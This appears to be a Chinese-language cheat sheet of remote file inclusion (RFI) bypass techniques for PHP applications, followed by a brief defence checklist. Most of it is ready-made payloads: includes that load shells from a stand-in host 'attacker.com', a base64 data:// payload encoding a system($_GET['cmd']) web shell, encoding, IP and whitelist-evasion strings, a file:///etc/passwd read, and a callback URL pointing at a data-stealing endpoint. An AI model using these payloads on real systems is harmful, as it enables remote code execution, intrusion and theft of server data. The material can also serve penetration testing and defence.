# RFI（远程文件包含）绕过秘笈

## PHP 远程协议利用

### allow_url_include/allow_url_fopen
```php
// 当这些配置启用时，include/require 支持远程URL
// php.ini:
allow_url_include = On    // 影响 include/require
allow_url_fopen = On      // 影响 file_get_contents/fopen 等

// 攻击代码
include($_GET['page']);   // include('http://attacker.com/shell.php');
```

### http:// 和 https:// 协议
```php
// 直接加载远程PHP文件执行
include('http://attacker.com/shell.php');
require('https://attacker.com/webshell.php?cmd=id');
```

### ftp:// 和 sftp:// 协议
```php
// 加载远程FTP服务器上的文件
include('ftp://attacker.com/shell.php');
```

### data:// 协议
```php
// 直接传递代码（需要 allow_url_include = On）
include('data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+');

// 绕过php字符串过滤
data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw==
```

## 编码和格式绕过

### URL编码绕过
```
http%3a//attacker.com/shell.php
https%3a//attacker.com/shell.php
ftp%3a//attacker.com/shell.php
```

### 双斜杠绕过
```
http:///attacker.com/shell.php       // 部分实现忽略
```

### IP地址绕过
```
http://127.0.0.1/shell.php           // Localhost绕过
http://192.168.1.1/shell.php         // 内网地址
http://0.0.0.0/shell.php             // 泛指
http://127.0.0.1:8080/shell.php      # 指定端口
```

### URL编码主机名
```
http://%61ttacker.com/shell.php       // attacker 的URL编码
http://attacker%2ecom/shell.php      // . 的URL编码
```

## 绕过 URL 白名单

### URL相似性绕过
```
// 白名单：example.com
// 绕过：
example.com.attacker.com              // 子域名绕过
attacker.com?host=example.com         // 参数似迹
attacker.com#example.com              // Fragment
attacker.com@example.com              // 用户名
```

### 端口绕过
```
http://example.com:80@attacker.com/shell.php    // 用户名:密码@主机
http://example.com:8080/shell.php               // 非标准端口
```

### 协议升级绕过
```
// 白名单仅允许 https
http://attacker.com/shell.php          // 改用 http（部分实现不验证）
file:///etc/passwd                     // 改用本地协议
```

## 常见 RFI 场景

### 参数注入
```php
// 危险：直接拼接URL
$page = $_GET['page'];
include($page . '.php');  // include('http://attacker.com/shell.php');

// 危险：模板引擎
$tpl = $engine->load($_GET['template']);
// load('http://attacker.com/malicious.tpl');
```

### Webhook/回调 URL
```php
// 危险：用户指定回调URL
$webhook_url = $_POST['callback_url'];
$response = file_get_contents($webhook_url);

// 攻击：指向恶意服务器
callback_url=http://attacker.com/steal_data.php
```

### 第三方库/API集成
```php
// 危险：允许用户指定API端点
$api_url = $_GET['api_endpoint'];
$data = json_decode(file_get_contents($api_url), true);

// 攻击：指向恶意API
api_endpoint=http://attacker.com/fake_api.php
```

### 模板引擎远程加载
```javascript
// 危险：加载远程模板
const template = await fetch(userProvidedUrl);
res.render(template.text);

// 攻击：加载恶意模板
userProvidedUrl=http://attacker.com/template.ejs
```

## 代码执行路径

### 直接执行
```php
// include/require 直接执行PHP代码
include($_GET['page']);          // 直接RCE
require_once($_GET['lib']);      // 直接RCE
```

### 经过处理后执行
```php
// 加载配置/数据，再在代码中使用（部分场景）
$config = parse_ini_file($_GET['config_url']);
// 虽然parse_ini_file不直接执行PHP，但可能存在其他利用

// 模板引擎加载远程模板并渲染
// 可能导致模板注入 + RCE
```

### 依赖链RCE
```php
// 远程文件引入恶意库，库中执行代码
include($_GET['lib']);  // 加载恶意库
// 库的全局代码执行时触发RCE
```

## 隐蔽 RFI 利用

### 通过日志/错误信息泄露信息
```php
// 虽然不是直接RCE，但可能泄露路径和服务器信息
@include($_GET['file']);  // 错误消息可能泄露路径

Warning: include(http://attacker.com/shell.php):
failed to open stream: HTTP request failed!
HTTP/1.1 404 Not Found (in /var/www/html/index.php on line 10)
```

### 结合其他漏洞的多步骤攻击
```
1. RFI加载中间件：加载伪装成日志的恶意文件
2. 日志文件被保存到系统
3. 通过LFI再次包含该日志文件
```

## 快速定位

**关键词**：
- include/require 直接使用 GET/POST/参数
- file_get_contents / fopen 加载用户URL
- 模板加载器接受URL参数
- Webhook/回调 URL 参数
- API 端点可被控制

**检查清单**：
1. 识别所有 include/require/file_get_contents 点
2. 追踪参数来源（GET、POST、文件、配置等）
3. 检查是否有 URL 白名单
4. 测试协议限制（是否只允许 http/https）
5. 测试 IP 限制（是否限制 localhost/内网）
6. 尝试基础RFI：`?page=http://attacker.com/shell.php`
7. 尝试编码绕过：`?page=http%3a//attacker.com/shell.php`
8. 尝试IP地址绕过：`?page=http://127.0.0.1/shell.php`

## PHP 配置检查

```php
// 查看危险配置
php -i | grep allow_url_include
php -i | grep allow_url_fopen

// php.ini 中的关键配置
allow_url_include = Off      // 默认关闭（PHP 5.2.0+）
allow_url_fopen = On         // 默认开启
auto_prepend_file = ""       // 自动包含文件（可被RFI利用）
auto_append_file = ""        // 自动追加文件
```

## 防御检查清单

- 禁用 allow_url_include 和 allow_url_fopen（php.ini）
- 白名单验证所有远程URL（域名、协议、端口）
- 使用 stream_context 限制远程连接超时
- 验证URL来源和格式（RFC 3986）
- 限制允许的协议（只允许 https，禁用 http/ftp/data等）
- 限制网络访问范围（禁止访问 localhost、内网IP、私有IP范围）
- 使用 DNS 黑名单防止 SSRF
- 实施严格的内容验证（MIME类型、签名验证）
- 定期审计所有包含和加载点
- 监控异常的远程连接
